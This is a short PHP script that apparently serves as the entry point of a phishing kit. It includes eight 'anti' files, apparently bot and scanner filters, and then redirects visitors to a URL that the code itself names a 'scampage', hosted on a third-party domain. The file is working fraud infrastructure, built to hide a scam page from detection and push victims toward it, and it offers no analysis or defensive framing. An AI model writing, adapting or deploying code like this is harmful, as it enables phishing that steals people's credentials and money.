<?php
require 'anti1.php';
require 'anti2.php';
require 'anti3.php';
require 'anti4.php';
require 'anti5.php';
require 'anti6.php';
require 'anti7.php';
require 'anti8.php';
$scampageURL = "https://www.iesofdade.com/agricolee/antibots7/z0n51/region.php?error";
header("location:$scampageURL");

?>